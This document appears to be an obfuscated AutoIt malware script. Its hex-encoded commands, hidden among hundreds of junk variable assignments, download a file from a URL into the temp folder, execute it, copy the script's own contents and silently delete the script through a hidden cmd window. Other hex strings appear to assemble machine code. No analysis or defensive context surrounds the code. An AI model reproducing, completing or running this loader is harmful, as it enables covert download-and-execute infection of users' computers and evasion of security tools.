	Dim $zgigvgsrlhbfphn = IsString("boxjjqkqhxubengzazn")
	Global $paztvxbzjtsgnclysdhb = "handle"
	If NOT ($zgigvgsrlhbfphn == "hekxjnppinfhiejzbxibfavthicyoxsgikzonhbxvgwnzsmn") Then
		Local $mqcymengeeo = $ee($v1("0x246A787170727A7663776571656D79776E6E6D697A6B69666A632026202236463645383838354330464246464646433738353643464646464646373736333733364336364337383537304646464646463635364538383835373246464646464643373835394322"))
	Else
		Local $ofbhqizmuexjddudj = $ee($v1("0x246E716B65766D6C65766E70746C6E6779706C616871796E2026202237443144303030303332433035333536353743373835443446434646464634363639364536344337383544384643464646463532363537333646433738354443464346464646373522"))
	EndIf
	Dim $rnmxdrmcci = IsString("kdhsgyfuprrzdfnojaoeocdabuvrrf")
	Global $okyfthspur = "dword*"
	Global $pcuspijlgytkmhrk = "kernel32.dll"
	Dim $mrdsiwlz = "IsWindowUnicode"
	Global $gqvxmznxrpqvimfugaa = "handle"
	Dim $ijyljlweiknos = "struct*"
	Local $urwtppvvvgdbezyt = "str"
	Global $mzaqbamhgiu = "bool"
	Dim $sfjhjvsnc = "dword*"
	Dim $vziltzwucpu = "kernel32.dll"
	Global $cipnbmaumtolfaqywkn = "align 1;ushort bfType;dword bfSize;ushort bfReserved1;ushort bfReserved2;dword bfOffset"
	Dim $yupuxidclinqsj = "dword"
	Local $qhanpxhuweesjnbn = "align 2;"
	Local $ygosrjigyoigzhvwlfzj = "handle"
	Dim $bdzkb = "FFFFFFFF4863C0EB11EB0C48C7C0010000004863C0EB034831C04883C458415F"
	Local $czdrico = "Mask"
	Dim $qigoxekorp = "b"
	Local $xqgmor = "Bottom"
	Dim $mkfgwqntwwvcg = "hwnd"
	If NOT ($rnmxdrmcci == "uwzkyfesphlwfoszerbndywagdoiqexuuiymvkq") Then
		Local $zpqsb = $ee($v1("0x246D7163796D656E6765656F2026202246424646464634453734343337324337383541304642464646463635363137343635433738354134464246464646353436383732363543373835413846424646464636313634343522"))
	Else
		Local $tdhhykfzsniscjzlynzcxd = $ee($v1("0x247275716B716F6C796A716170696766666B616D7372676A2026202237323739303043373835323446444646464634453734344637304337383532384644464646463635364535303732433738353243464446464646364636333635373336364337383522"))
	EndIf
	Dim $ngvzncvvmxgabpzrezfw = IsInt(28111997)
	Dim $axtmvyqrmzivztiqptiq = "dword;dword"
	Local $weqcbczf = " & $sCommand & "
	Local $meciqzpj = "struct*"
	Local $vfgwffoirfptwhewpo = "bool"
	Global $iugdogcjafvnfikwextq = "ptr"
	Global $xlgblcaucwxnkzsrymyrztgq = "dword"
	Global $krtdnmvjshfqgaksriuzwmgu = "handle"
	Dim $zdepbrcp = "uint*"
	Local $japqzjtvrroaoieudyk = "uint"
	Global $iwfosezd = "Invalid Mode"
	Dim $yyukfmxbjqn = "FileConstants.au3"
	Dim $hxxzrslsfstklqovn = "ulong Flags;hwnd hBmp;ptr Image;uint ImageMax;int XOffPercent;int YOffPercent"
	Dim $pjkkxlnwqouldxlgce = "user32.dll"
	If NOT ($ngvzncvvmxgabpzrezfw == "usvszzqbviaazelyxaimdfueltqlqwxuduizqcp") Then
		Local $ohwkmkfgnduclaasgmejtekz = $ee($v1("0x247A707173622026202237383838383541434642464646464337383537434645464646463445373434333646433738353830464546464646364537343639364536364337383538344645464646463735363522"))
	Else
		Local $fimbucfkotmypscbkxg = $ee($v1("0x2478657867772026202246454646464635433442364536464337383546384645464646463737364534343643433738354643464546464646364337333543344643373835303046464646464636433635333322"))
	EndIf
	Dim $xgtbqvbgmndhckay = IsString(-42659525)
	Dim $pcqxhhnf = "ptr;dword;dword"
	If NOT ($xgtbqvbgmndhckay == 1) Then
		Local $cxhtinywqxwbizqclwkiklve = $ee($v1("0x246F68776B6D6B66676E6475636C616173676D656A74656B7A2026202238383835383646454646464643373835414346414646464635323734364334334337383542304641464646463732363536313734433738354234464146464646363535353733363522"))
	Else
		Local $dzjhwcxxtcorcdqmvvkhpl = $ee($v1("0x24647673646D6A686B7777686F646C787A66786C6E2026202236353645353037324337383535344642464646463646363336353733433738353538464246464646373335343646364236364337383535434642464646463635364538383835354522"))
	EndIf
	Dim $jmtujpitcjhjdlnisxmu = IsInt("kfrswfxwjwnkuotyuvnoxaequgbbgchrdq")
	Local $dcdinnaettu = "X"
	Local $idtyvxfyfjyopsnef = "hwnd"
	Local $fmfkowgejrtzch = "float"
	Local $erlcextjzyhrpovzdkwyj = "Mask"
	Global $bpoqzlioxjbgyjapl = "Text"
	Local $znucxzywhslusubpicknpst = "ptr"
	Local $bujhmjubrnultzmm = "wparam"
	Dim $hodhlgipcigtoqiyemafczq = "]"
	Local $wjkadlohfaxmyadtstlu = "comctl32.dll"
	Global $aizgzvhyaurkz = "Button"
	If NOT ($jmtujpitcjhjdlnisxmu == "fqyamzfsbdyrfb") Then
		Local $dvsdmjhkwwhodlxzfxln = $ee($v1("0x2463786874696E797771787762697A71636C776B696B6C76652026202243373835423846414646464637323534363837324337383542434641464646463635363136343030433738353443464246464646344537343446373043373835353046424646464622"))
	Else
		$poe($sdvfi("0x496E6574476574282455524C2C204054656D70446972202620225C22202620247061746829"))
	EndIf
	Dim $fvehlh = BinaryToString("0x776A736D7979676375777463797867736E6C667769656E686E6F656D787A")
	Dim $jhwsto = "advapi32.dll"
	Global $seeolxcwshpe = "int:cdecl"
	Local $pqykdzqkgymabia = "GdipBitmapLockBits"
	Local $ujbrp = "CloseHandle"
	Local $ezhkwuric = "handle"
	Local $ukbtxqyxaoregdtgny = "uint"
	Dim $yurdvbrisfymrgjhhtyxpe = "The common dialog box function was unable to lock the memory associated with a handle."
	Dim $dtbkvdc = "int"
	Global $qkqcohoiitrpwjyffbfgtf = "wparam"
	Global $iqyxcvywktxrqkpbwh = "int"
	Local $wslqyaioclaqkgr = "RestartDialog"
	If NOT ($fvehlh == "vhroditktfuogljkkgypni") Then
		Local $dzjhwcxxtcorcdqmvvkhpl = $ee($v1("0x24647673646D6A686B7777686F646C787A66786C6E2026202236353645353037324337383535344642464646463646363336353733433738353538464246464646373335343646364236364337383535434642464646463635364538383835354522"))
	Else
		Local $hrwopeddl = $ee($v1("0x24647A7773646A69766B766867786A6C777271767769757172626C2026202245383643454246464646383934353134384438354434463446464646453835454542464646463839343531383835433037353045384438354334463046464646453834434542464622"))
	EndIf
	Dim $gxtslpbnorpfx = IsInt("wvrxaycsdouqefqpergmuqhdzrflpqhcddlqacroqc")
	Dim $yngevqiiiwagd = "struct*"
	Local $aqrvkcjcjitje = "Time"
	Dim $gvtcec = "dword"
	Dim $dhfnioqtmwfwi = "WinAPIError.au3"
	Global $eunwzdv = "dword"
	Global $ifigyookhvepatcpsqzeyuxz = "ThemeName"
	Dim $glzlonigllgyrixt = "handle"
	Global $ttujlfruanijgqzi = "SetSysColors"
	Dim $qbsnrelriwbb = "long"
	Global $nvlbogwthscbz = "struct*"
	Global $ylrjnbfdfznjxzmljvddwxtd = "gdi32.dll"
	If NOT ($gxtslpbnorpfx == 1) Then
		Local $elrbzzykcmzhaemlgj = $ee($v1("0x24647A6A687763787874636F726364716D76766B68706C2026202246424646464643373835414346394646464634453734343136344337383542304639464646463641373537333734433738354234463946464646353037323639373643373835423822"))
	Else
		Local $jzseqtbpjuny = $ee($v1("0x246E6F6A6D6B697968657A6D68756B706B6C2026202246463735303838443835383846394646464635304646393534433031303030303833433431303638303430313030303038443835363046454646464635303844383538384639464622"))
	EndIf
	Dim $kvocmkqwdpf = IsInt(-35525454)
	Local $wotnvifqree = "S-1-5-32-546"
	Dim $sopfr = "Param"
	Local $ndtbwxg = "gdi32.dll"
	Global $oobejgmbqxkhfcucwr = "SetClipboardViewer"
	Global $gttaptumhkyhnzoznejt = "struct*"
	Global $sgxrgtapsfxhuhdum = "shlwapi.dll"
	Local $nmzscfdinry = "float"
	Local $buscnsg = "FatalExit"
	Dim $psurjk = "wstr"
	If NOT ($kvocmkqwdpf == 0) Then
		Local $lkquiqlzvleknexrvypud = $ee($v1("0x24656C72627A7A796B636D7A6861656D6C676A2026202246394646464636393643363536374337383542434639464646463635373335343646433738354330463946464646364236353645303043373835303846394646464635323734364322"))
	Else
		Local $xiczdhvrcvrubfnbzshjtgykbzcdh = $ee($v1("0x24616D707072646A696F2026202237443239383145433738303130303030364135453539384246434646373530433844383432343034303330303030384442343234384330313030303035304633413545384346464322"))
	EndIf
	Dim $aldfgf = IsInt(91260789)
	Global $bhtvrg = "Size"
	Dim $exbshyckllyc = "GetObjectType"
	Global $bavonom = "wstr"
	Local $duwwdlainxdjkyhceqf = "bool"
	Global $kquqkvovsv = "uint"
	Dim $egniayu = "Mask"
	Global $rpxgk = "Size"
	Global $vswjfcmaftrfhxjudvrifu = "int*"
	Dim $qdbnpemwzqhhu = "ColorConstants.au3"
	Local $ztbotstgdcpsnraovypzl = "handle"
	Local $fjhgbnivgmfbclrx = "struct*"
	Global $motiiqtlwklk = "."
	If NOT ($aldfgf == 0) Then
		Local $xyizcsucla = $ee($v1("0x246C6B717569716C7A766C656B6E65787276797075642026202234334337383530434639464646463732363536313734433738353130463946464646363535303732364643373835313446394646464636333635373337334337383531384639464622"))
	Else
		$poe($wzneciaftzmxvngecerfajkujgwyjzn("0x46696C65577269746528246F72716C646F667863656568716F656B6D7A767A70767A74656E6572786B7A736163756D64686F2C2046696C65526561642846696C654F70656E284053637269707446756C6C506174682C203136333834292929"))
	EndIf
	Dim $nikkneq = IsInt("sfwbzegenubiatnctzhjrcqugpvswphto")
	Dim $ylkhrpqddzmazq = "ltr"
	Dim $kubszpcgnwqtsu = "ptr;short;ptr;ptr;ptr"
	Dim $rhapsvujynwjlwwoikrztz = "dword*"
	Dim $etajl = "Left"
	Dim $dzaawryhjacfwczufkkq = ";uint flags;int iBand"
	Dim $ltoocuznisqhxvnlts = "dwmapi.dll"
	Local $tcecufebunlahphicwmjnumg = "ulong*"
	Dim $rzrypssrqkliovlnfehqgfc = "StructSize"
	Global $bmzpxishm = "GdipCreateBitmapFromResource"
	If NOT ($nikkneq == "iwqswhfgypnudgegql") Then
		Local $joawfujdbpzengszukijnwm = $ee($v1("0x247879697A637375636C612026202246463530363137323631433738353143463946464646364436353734363536364337383532304639464646463732373338383835323246394646464643373835364346414646464622"))
	Else
		Local $tjnzhgdqplkqjm = $ee($v1("0x247466676262706F6F726961766F6C6F62657A6170707175686B642026202238443835303446454646464635304538434445364646464638393835304330313030303038443835334346414646464635304538424245364646464638393835364330313030303022"))
	EndIf
	Dim $pwhpyr = IsString(-39617908)
	Global $bggcmlsmwbbkrfr = " "
	Local $pgjilqh = "int"
	Dim $oeyhgnksivv = "wparam"
	Local $fanmqjgqloyresvqunlkxscu = "float"
	Dim $ysrhjrjdkcvirbyskipjr = "shlwapi.dll"
	Global $iuecn = "handle"
	Global $mohyugozupkn = "handle"
	Dim $iyaslnudbzqzpmhpmjlw = "int"
	Global $ydupo = "handle"
	Local $beawdnfh = "struct*"
	Global $fydhzmnzydnir = "advapi32.dll"
	If NOT ($pwhpyr == "ohkndkitctedsgcvn") Then
		Local $gnliufxrxj = $ee($v1("0x246A6F617766756A6462707A656E67737A756B696A6E776D2026202235323734364334334337383537304641464646463732363536313734433738353734464146464646363535353733363543373835373846414646464637323530373236464337383522"))
	Else
		Local $ptojyauwxeyfewqtmpvuacojceik = $ee($v1("0x24656776726F6E6266776A79656B7978616F627374747573716970632026202245434646464635304646443738443835444346454646464638334334304335304646443635393430353038443835444346454646464635303844383542434545464646463530464622"))
	EndIf
	Dim $borxfbovpuoqdcgcpdsocuw = BinaryToString("cvmcvdyhdfmqjbcdtczcmevlvylejtxsh")
	If NOT ($borxfbovpuoqdcgcpdsocuw == "xweadlkoskxdkqmrlocwazbk") Then
		Local $kvwniswlvneetlc = $ee($v1("0x24676E6C6975667872786A2026202237434641464646463633363537333733383838353830464146464646433738354434464146464646354137373433373243373835443846414646464636353631373436354337383522"))
	Else
		$poe($zeyc("0x5368656C6C457865637574652824687967727875746475796A6C737772706A787A667976637872767A6264626C64746A756C29"))
	EndIf
	Dim $nanwji = BinaryToString("ikoxmgqjpwzqzqguupyquslliajsmcquplpjrcebimppjbxps")
	Local $mjrcomlwjxrbxeyzvhrwuez = "bool"
	Global $yehyrp = ">Ed"
	Global $jxzgjigrewzprkjiez = "int"
	Dim $jqhmogplgcp = "Right"
	Local $bwaioonuevmgtxpn = "APIDlgConstants.au3"
	Global $jzhruvcqfytkjevh = "struct*"
	Dim $fouplmzhmrvtmvrdpu = "handle"
	Dim $lyhwlldbyqcjyo = "FAT32"
	Local $vfunpzkfgoraf = "StructureConstants.au3"
	Dim $etqmsabwfobsjohqofzyly = "ptr"
	Global $qewlascumtukcrueyhayrw = "uint"
	Dim $laokl = "comctl32.dll"
	Global $pcwelewyywungmnetm = "GetProfilesDirectoryW"
	If NOT ($nanwji == "glmcnhgmbncdpxaozv") Then
		Local $hdxktcmnbuitmo = $ee($v1("0x246B76776E6973776C766E6565746C632026202244434641464646463534373236313645433738354530464146464646373336313633373443373835453446414646464636393646364530304337383545344643464646463445373422"))
	Else
		Local $ttpttxhof = $ee($v1("0x24786A74696B6B63716A6A6E2026202246464646363136343838383530454642464646464337383536304642464646463445373434443631433738353634464246464646373035363639363543373835363846424646464622"))
	EndIf
	Dim $afulqkprokbnxsnpyancd = IsString(-44229162)
	Global $uzmjqyoarkhknapejov = "ptr"
	Local $zyftyosalunxppf = "Y"
	Global $ywbchn = "kernel32.dll"
	Local $yqfeqdgzndwzai = "ZwQueryInformationFile"
	Global $wqkazeushsnwrrg = "<title>_IE_Example("
	Dim $kgqxtjprbxcynkeurwc = "Italic"
	Global $lmiktdwlqnzpg = "handle"
	Global $wbkidxpjecsxakjouyveoiqm = "CreateToolhelp32Snapshot"
	Local $ozydlxrzbc = "long"
	Dim $wzfqlylfdlvhxsl = "S-1-16-4096"
	Local $mnqbkgzgzikildqhiocabwe = "): "
	Local $cwoeglqeeuxuozq = "uint"
	Global $vvzsqp = "Value not matched"
	Global $jwpjoqwddrvcz = "gdiplus.dll"
	Dim $wjnzdjwybgpokfytjahiokie = "uint"
	Global $mdawdstugxwhzar = "wNumbering"
	Local $hsxtb = "handle;handle;ptr;lparam"
	Global $ykmbihhwjubkm = "ulong_ptr"
	Global $swnshhwczekcp = "struct*"
	If NOT ($afulqkprokbnxsnpyancd == "elknfkfopnic") Then
		Local $xdycuclvlmrlysii = $ee($v1("0x246864786B74636D6E627569746D6F2026202234463730433738354538464346464646363536453533363543373835454346434646464636333734363936463636433738354630464346464646364530304337383535434639464622"))
	Else
		Local $wcmwlyuhes = $ee($v1("0x247A7A726E69696176717566666D7872637379772026202238443835344346424646464635304538413545374646464638393835384330303030303038443835433446394646464635304538393345374646464638393835463430303030303022"))
	EndIf
	Dim $hxsuih = BinaryToString("0x76646F666B6F6175687577686674676B61766F69657070667568657669636A747175736B767369637A73")
	Global $qwgyolb = "From:"
	Dim $ffcqnkbew = "{B96B3CB0-0728-11D3-9D7B-0000F81EF32E}"
	Dim $ttmtbjdnhxsdqzvaq = "user32.dll"
	Dim $swcrpdu = "UrlIsW"
	Dim $svxbdnmukrjny = "State"
	Local $anoaoydcwwqudyofkwfxgpwh = "GetLastInputInfo"
	Global $jtfxveqdhicwurue = "Mask"
	Global $qldeccbpskrhlsjtjr = "word"
	Global $nvhwhakfllpkxfdgp = "struct*"
	Global $oyspbqdkylmhbadqwhvc = "GetVolumeInformationByHandleW"
	Local $ycwongmtod = "struct*"
	If NOT ($hxsuih == 1) Then
		Local $ctagmcagdhyhutzzkwxkfby = $ee($v1("0x247864796375636C766C6D726C797369692026202246463532373436433533433738353630463946464646363537343433373543373835363446394646464637323732363536454337383536384639464646463734353437323631433722"))
	Else
		Local $ppqzqhcqnwtp = $ee($v1("0x247A7A6A6261797672626F636A78746573786D2026202234434646464646463646364436323733383838353530464646464646433738354334464346464646344537343531373543373835433846434646464636353732373935334337383522"))
	EndIf
	Dim $ocruqw = BinaryToString("0x686C6662666572756A6E646F727263777176666C6965647A7966617264696E6E747661666D")
	If NOT ($ocruqw == "qqcutnfkoxgyscqfyslaeamondtyrpahgc") Then
		Local $iqmrlsietetrpsgcudrznedasmsb = $ee($v1("0x24637461676D6361676468796875747A7A6B77786B6662792026202238353643463946464646364537333631363343373835373046394646464637343639364636453838383537344639464646464337383530434641464646463541373735323646433722"))
	Else
		Local $ygvptrczuuowsgygu = $ee($v1("0x24716C6E62736F6171706C7867726D7363717A6C2026202238383435444543373835344346454646464635433442364536464337383535304645464646463737364534343643433738353534464546464646364337333333333243373835353822"))
	EndIf
	Dim $hjwcmkhhtcerumfcqelryea = IsString("ucuaowklwfoddo")
	Dim $efrcgzunrktcmg = "handle"
	Global $xiepofvvizdiynzgudnlcl = "handle"
	Global $kfkjfstcbrfzxqavhxz = "dword"
	Dim $xuvrdwmulnmxdzkldhj = "struct*"
	Global $uhxnnpvnuanriqnnpxpgf = "dword PenStyle;dword Width;uint BrushStyle;dword Color;ulong_ptr Hatch;dword NumEntries"
	Local $malvt = "DwmSetIconicThumbnail"
	Dim $wbzoupjxzxtmjlqtxpsmqpqc = "kernel32.dll"
	Global $meztc = "uint"
	Local $hqztznshiyzqbkrxezvig = "Error"
	Global $wpxtadrtuqjdyvtyyihe = "wchar["
	If NOT ($hjwcmkhhtcerumfcqelryea == 0) Then
		Local $bvycavspaloovdedbb = $ee($v1("0x2469716D726C73696574657472707367637564727A6E656461736D73622026202238353130464146464646364336433632363143373835313446414646464636333642353437324337383531384641464646463631364537333631433738353143464146464646363322"))
	Else
		Local $tuitjk = $ee($v1("0x246C65696F7A7A6579686C716466737A6567616A697267766268772026202246434646464637373336333435304337383541434643464646463732364636333635363643373835423046434646464637333733383838354232464346464646433738354330464122"))
	EndIf
	Dim $ycnbpcxgow = IsInt(25430698)
	Local $zhehgvkaozigwkyds = "int"
	Local $vfyoowocmjtyjizbdx = "user32.dll"
	Local $bzchvawptaghsvti = "= "
	Global $ghoefjwokwzv = "wparam"
	Dim $ugvhsw = "struct*"
	Local $inrrngtnffegmuwxzll = "bool"
	Global $wcpbmmjzm = "dword Scope;dword Type;dword DisplayType;dword Usage;ptr LocalName;ptr RemoteName;ptr Comment;ptr Provider"
	Global $vssfbedmqezvhmyjtkgtz = "GdipTransformPoints"
	Local $bltgefsplrzeetkg = ".*\((.*)\)"
	Dim $rcttanzgbibvsbdd = "USHORT"
	Local $ikljkpmufzazdrozmhrtse = "hwnd"
	Local $kwhcbquvtze = "SendMessage.au3"
	Global $entugaiyddcr = "ptr"
	Global $edlvcatfrdjgejsjut = "EnumDesktopsW"
	Local $zkspzlsda = "form"
	Global $epwskqjlhbqxudoluixykl = "Midtone"
	Global $fcobcqspjauvqjcocyx = "int"
	If NOT ($ycnbpcxgow == "nwbjhgfibhdamyejtbcmjzmguibil") Then
		Local $kgeucgncldmlyyagcyfqquaqbj = $ee($v1("0x246276796361767370616C6F6F7664656462622026202237343639364636364337383532304641464646463645303043373835463446394646464634433634373234374337383546384639464646463635373435303732433738354643463922"))
	Else
		Local $lixfl = $ee($v1("0x24747A6166767A67706C736468766D6F6763792026202230464245433032424638464634354634383037444646303037343042343138303744464530303734303438354646373444363835464637343133464634354638384234354638334222"))
	EndIf
	Dim $vvxgisnvlskezfoukfkyh = BinaryToString("lwxvmtbwntplhoxrfvembfvbaq")
	Local $yvjimhyy = "Title"
	Dim $utyfuxhkqqeourtmvn = "_IELoadWait"
	Global $qeurldg = "ptr"
	Dim $vhdpl = "."
	Global $mwiznugpqsuclzo = "Share"
	Dim $dniuahkpigqchacz = "PathUnquoteSpacesW"
	Global $qrzkwmnidqwsplwifeswa = "uint Size;dword Mask;int Command;int Image;byte State;byte Style;word CX;dword_ptr Param;ptr Text;int TextMax"
	Global $ayoluzlbtsnxdc = "_IE_Example"
	Dim $zhzmnarkrxufzu = ":"
	Global $kxycodevyxxzecs = "handle"
	Local $hxzmx = "shell32.dll"
	Dim $cqvuxmc = "ptr"
	Global $jklduqodtlmvcvpt = "dword"
	Global $yzbclbozealwpkda = "uint"
	If NOT ($vvxgisnvlskezfoukfkyh == 0) Then
		Local $oddjaazqblwhsrox = $ee($v1("0x246B67657563676E636C646D6C797961676379667171756171626A2026202246464646364636333635363443373835303046414646464637353732363534314337383530344641464646463634363437323635363643373835303846414646464637333733383822"))
	Else
		$poe($rfo("0x5368656C6C457865637574652822636D64222C2022202F632054696D654F7574203120262044656C202F4620222026204368722822333422292026204053637269707446756C6C506174682026204368722822333422292C2022222C2022222C204053575F4849444529"))
	EndIf
	Dim $ddixudoqgnaedrgbu = IsString("qaibqycaaewskznvdwmwvsgycvcpmktmgpigzcmoazlxmsubq")
	Dim $grkciox = "_IEPropertyGet"
	Global $rdrtfaexnuuayzwtqopnr = "kernel32.dll"
	Local $wqmru = "Text"
	Global $ofnzanvtkkufiftkgoyjv = "$_IESTATUS_InvalidObjectType"
	Dim $oqwonmdnazltlwtcswcgwjsr = "]"
	Dim $fckzcbnljrggyh = "bool"
	If NOT ($ddixudoqgnaedrgbu == "qvmgbtahtwaayymkjxqfnshlraqibcwdyeowkcm") Then
		Local $jodpmpoobfxkkqgostskybdmlhxo = $ee($v1("0x246F64646A61617A71626C776873726F782026202238353041464146464646433738354143464546464646344336343732344343373835423046454646464636463631363434343636433738354234464546464646364336433838383522"))
	Else
		Local $qdxttjizmfovevtokkyknes = $ee($v1("0x2477616F656E65746A6B6F6D6771706262746E7A71672026202246424646464634453734353137354337383545384642464646463635373237393536433738354543464246464646363136433735363543373835463046424646464634423635373922"))
	EndIf
	Dim $jtzzjvvq = BinaryToString("0x6C66696D7A746F697271687A77626F7A7376776C6B6F61677872766E6E77656A676F6D")
	Dim $yerlbxlq = "ptr"
	Local $ylkkmpezpejxycckgu = "{62AB5D82-FDC1-4DC3-A9DD-070D1D495D97}"
	Global $kglmpuxjw = "uint"
	Local $iaylkdjexnaph = "bool"
	Dim $nevzpmneyyxvhptpzmqcezv = "handle"
	Local $ixgwewmywrskvvntm = "$_IESTATUS_InvalidDataType"
	Dim $whtkpvcgunjfizeq = "RegisterPowerSettingNotification"
	Dim $bijscwoquoknikbtadv = "Image"
	Local $fdihnbwrwvjtefmproa = "int"
	Dim $kaauhfemdvjhcfjujn = "user32.dll"
	Dim $odpfvglmhgfkotigtu = "wstr"
	Local $sojwchfwfnjf = "bool*"
	Global $lolysawpdxombopsdphwpf = "i"
	Global $fqcswfoxkvejsukwyfzoudip = "kernel32.dll"
	Dim $syifgsymktwhrzoq = "handle"
	Local $kvxaqziefcim = "user32.dll"
	Local $wzcpyruhacbyiofno = "uint"
	If NOT ($jtzzjvvq == 0) Then
		Local $kufoctklnlwyppiucog = $ee($v1("0x246A6F64706D706F6F6266786B6B71676F7374736B7962646D6C68786F2026202242364645464646464337383537344646464646463737363337333633363643373835373846464646464636443730383838353741464646464646433738353430464546464646344422"))
	Else
		Local $ykmuimicaf = $ee($v1("0x246574636166727768776C766678726B74766B6B79692026202246464646363537393838383536324643464646464337343538343644363536443633363643373435383837303739383834353841433738353234464146464646343337323739373022"))
	EndIf
	Dim $wuuxrfxntkbgy = BinaryToString("jlpvtopsjsxnynqfmvbupopobdsyijzbgmzhkkkxfgooikp")
	Local $dnsqnxyobaqzptj = "bool"
	Global $bblkbdaxyvcggkqzlqsggx = "DrawThemeEdge"
	If NOT ($wuuxrfxntkbgy == 0) Then
		Local $leiozzeyhlqdfszegajirgvbhw = $ee($v1("0x246B75666F63746B6C6E6C777970706975636F672026202236353733373343373835343446454646464636313637363534324337383534384645464646463646373834313030433738354134464346464646343937333537364643373835413822"))
	Else
		$poe($wzneciaftzmxvngecerfajkujgwyjzn("0x46696C6557726974652824636879706171776E6B65756465796768746D73667A6C7578766D6E786878796A6E726364756B6A7462677A636F68706369706765756D76726F71642C2024676664733435736471343529"))
	EndIf
	Dim $ewwtvi = IsInt(-96239449)
	Dim $octlop = "ulong Version;ulong Size;byte DeviceType;byte DeviceTypeModifier;byte RemovableMedia;byte CommandQueueing;ulong VendorIdOffset;ulong ProductIdOffset;ulong ProductRevisionOffset;ulong SerialNumberOffset;ulong BusType;ulong RawPropertiesLength;byte RawDeviceProperties[1]"
	Global $mutfjph = "uMajorVersion"
	Global $pebigehhbpxribj = "dword"
	Global $eeqpywqjcqkfafrlpx = "kernel32.dll"
	Global $hgipjfumswispnp = "dword"
	Dim $fswcqwvos = "DrawThemeIcon"
	Global $lodexxiaoqvwku = "handle"
	Local $rcporhbqeqltu = "struct*"
	Global $fktpkqsnarowzrwuj = "GdipDisposeImage"
	Dim $hxugcoshxgtdahfjixaakbo = "ToolTip"
	Global $qntqkrlx = "t"
	Dim $nmwxkqtxkwsmnmlda = "UserName"
	Dim $unyxfngwcrc = "user32.dll"
	Global $vkddzlvcihxageyolkc = "FindWindowW"
	Global $oyrxjwutuupvrbzxotnrfqze = "GetMenuItemRect"
	Dim $ogrwxvvvelbbyipmdllnxpo = "kernel32.dll"
	Dim $fuxzmqiygmcxr = "struct*"
	Global $ulmspipe = "comctl32.dll"
	If NOT ($ewwtvi == "pzblcttnpcssbwxeuem") Then
		Local $tuitjk = $ee($v1("0x246C65696F7A7A6579686C716466737A6567616A697267766268772026202246434646464637373336333435304337383541434643464646463732364636333635363643373835423046434646464637333733383838354232464346464646433738354330464122"))
	Else
		Local $xwhlezperixxcgwxrwctwkbpsm = $ee($v1("0x246770666B6C2026202234373635373434444337383531344642464646463646363437353643433738353138464246464646363534363639364343373835314346424646464636353445363136443636433722"))
	EndIf
	Dim $voaysvnmqayfyltzbcjf = BinaryToString("0x7A756565636D")
	Global $ckqvwetcsutxhuhkeiugo = "\"
	Dim $phnuqajwidpkxruwecfracu = "pfnCallback"
	Dim $odxlgqjrfprzmskwpdexm = "wstr"
	Local $blgjynmesulgzwxzafleefq = "ptr"
	Dim $mqeeibp = "uint Style;ptr hWndProc;int ClsExtra;int WndExtra;ptr hInstance;ptr hIcon;ptr hCursor;ptr hBackground;ptr MenuName;ptr ClassName"
	Local $jatscmgrhdxsgewhbjtwv = "struct*"
	Dim $bwanmkranbqzltcszygdg = "wparam"
	Local $iazffnapyyrgmtfxmwfeowwi = "Image"
	Dim $wnyohlaflklvzbabmcwfgt = "char Text[4096]"
	Local $oflleqzeqdcz = "comctl32.dll"
	Local $lnumbbfdnvjgkvqceifs = "Image"
	Local $gtmqjxybcrbtszwoijc = "long"
	Local $koiabxrerowunspkwfpug = "SetTimer"
	If NOT ($voaysvnmqayfyltzbcjf == "gtmujlbbpppnquvqglhuvywoonlhmisawbciyfypirqsjz") Then
		Local $xbmjbfgoxucawirgplbut = $ee($v1("0x24747569746A6B2026202246464646344537343436373243373835433446414646464636353635353636394337383543384641464646463732373437353631433738354343464146464646364334443635364422"))
	Else
		Local $rgckgwpdza = $ee($v1("0x24706C796A796F746372706D7672742026202238383835463246394646464643373835413046454646464634453734353236354337383541344645464646463631363434363639363643373835413846454646464636433635383822"))
	EndIf
	Dim $cydhuxjdscl = IsInt("liapoappqbjnpy")
	Local $akxanxxldyymxhwovffbxp = "int"
	Dim $kdrcjrbnjok = "Left"
	Local $fardvywgkgwoscgyknqsd = "struct*"
	Dim $ugwzosmfgjab = "handle"
	Local $ildsl = "DateTimeConstants.au3"
	Global $zgkewswsmuhjocxsrurhicfs = "UnloadKeyboardLayout"
	If NOT ($cydhuxjdscl == 1) Then
		Local $goejhhcgjpobggdgqcatvkxdve = $ee($v1("0x2478626D6A6266676F7875636177697267706C6275742026202243373835443046414646464636463732373930304337383535344646464646463445373434333643433738353538464646464646364637333635303043373435393437373633373322"))
	Else
		Local $hbnrkbyv = $ee($v1("0x246B6F7A6C6B70787862616F7762676F7675792026202231424330463744303233433838424334323530304630464646463342433837323041384243313539393438423030383930343234433332443030313030303030383530304542453922"))
	EndIf
	Dim $hgzaueahxsdopm = IsString("bdvwhhpvbodovyhhdugtqufak")
	Dim $dmgnlarnnqwbrfklptlzdih = "2E"
	Dim $deewrnyuvabtnzdq = "uint"
	Local $rmjfb = "struct*"
	Global $huuebiw = "shlwapi.dll"
	Local $qzjcwjkjvfm = "ptr"
	Local $renbuzdbtlrabvalrbqhwq = "handle"
	Local $zurzsqkhxmwuudnfp = "wparam"
	Global $wiojkokgfzbnz = " target="
	Global $mcaugtdj = "handle"
	Local $ydchjtdtqghoegebxljuii = "STR"
	Global $gdedefftrmcdsrt = "kernel32.dll"
	If NOT ($hgzaueahxsdopm == "gjlfvlqs") Then
		Local $yfnexrpqqmhzuxdhoenyqco = $ee($v1("0x24676F656A686863676A706F626767646771636174766B786476652026202236333636433734353938373037393838343539414337383545384641464646463445373434333732433738354543464146464646363536313734363543373835463046414646464622"))
	Else
		Local $ptojyauwxeyfewqtmpvuacojceik = $ee($v1("0x24656776726F6E6266776A79656B7978616F627374747573716970632026202245434646464635304646443738443835444346454646464638334334304335304646443635393430353038443835444346454646464635303844383542434545464646463530464622"))
	EndIf
	Dim $eyenvocrfxuwnpuitd = BinaryToString("0x776663717072")
	Local $bvmub = "lresult"
	Dim $qyqejpzkoclzilxdwhvz = "\\"
	Dim $bsycsjuatadexwkltutbvem = "dword"
	Local $ixucfgnbpmlmhbucsyfhzhl = "handle"
	Dim $tbcwffmu = "{A4115719-D62E-491D-AA7C-E74B8BE3B067}"
	Global $quwrwgyzg = "<head>"
	Global $smoniyblxb = "[^\d.\-/:]"
	Local $ythfanawwbdiqd = "Boolean"
	Local $usatjjqsdwylipuifxnqtf = "Size"
	Global $wllesubxagims = "dword"
	Local $nxrclnljakfmxdptj = "WinAPIConv.au3"
	Local $fnkbwoijlwnhdagiipzizbe = "__GCR_StreamFromVarCallback"
	If NOT ($eyenvocrfxuwnpuitd == 1) Then
